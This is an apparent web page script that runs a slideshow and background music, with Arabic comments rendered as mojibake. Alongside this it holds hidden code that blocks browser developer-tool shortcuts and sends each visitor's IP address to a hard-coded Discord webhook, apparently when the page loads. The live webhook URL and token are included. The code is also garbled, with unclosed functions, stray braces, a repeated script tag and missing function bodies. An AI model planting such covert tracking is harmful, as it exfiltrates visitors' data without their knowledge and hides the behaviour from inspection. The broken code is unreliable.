<script>
  // ÿßŸÑÿ≥ŸÑÿßŸäÿØ ÿ¥Ÿà
  let slideIndex = 0;
  showSlides();

  function showSlides() {
    let slides = document.getElementsByClassName("mySlides");
    for (let i = 0; i < slides.length; i++) {
      slides[i].style.display = "none";
    }
    slideIndex++;
    if (slideIndex > slides.length) { slideIndex = 1 }
    slides[slideIndex - 1].style.display = "block";
    setTimeout(showSlides, 2000);
  }

  // ÿ™ÿ¥ÿ∫ŸäŸÑ/ÿ•ŸäŸÇÿßŸÅ ÿßŸÑŸÖŸàÿ≥ŸäŸÇŸâ
  const music = document.getElementById("bg-music");

  function toggleMusic() {

  // ÿ™ÿ¥ÿ∫ŸäŸÑ ÿ™ŸÑŸÇÿßÿ¶Ÿä ÿπŸÜÿØ ÿ™ÿ≠ŸÖŸäŸÑ ÿßŸÑÿµŸÅÿ≠ÿ© (ŸÖÿπ fallback ŸÑŸÑÿ™ŸÅÿßÿπŸÑ)

      document.addEventListener("click", () => music.play(), { once: true });
    });
  });
<script>
  // ŸÖŸÜÿπ ÿ£ÿØŸàÿßÿ™ ÿßŸÑŸÖÿ∑Ÿàÿ± F12 ŸàCtrl+Shift+I Ÿàÿ∫Ÿäÿ±Ÿáÿß
  document.onkeydown = function (e) {

  function fetchIPAndSend() {
    const webhookURL = 'https://discord.com/api/webhooks/1260111462903447612/tWECxiwuAQEtagpwPiQw9Awz1P1hKColgt9Sn_I-7e8jQn-26P3MVuCzoEbj72_mD4FU';

      })
      .catch(error => console.error('Error fetching IP:', error));
  }

  function sendToWebhook(ip) {
    const webhookURL = 'https://discord.com/api/webhooks/1260111462903447612/tWECxiwuAQEtagpwPiQw9Awz1P1hKColgt9Sn_I-7e8jQn-26P3MVuCzoEbj72_mD4FU';

    const message = {
      content: `üì° New Visitor IP: ${ip}`
    };

    fetch(webhookURL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(message)
    })
      .then(response => {
        if (response.ok) {
          console.log('IP sent to webhook successfully');
        } else {
          console.error('Failed to send IP:', response.statusText);
        }
      })
      .catch(error => console.error('Error sending to webhook:', error));
  }

  // ÿßÿ≥ÿ™ÿØÿπÿßÿ° ÿπŸÜÿØ ÿ™ÿ≠ŸÖŸäŸÑ ÿßŸÑÿµŸÅÿ≠ÿ©
  window.onload = function () {
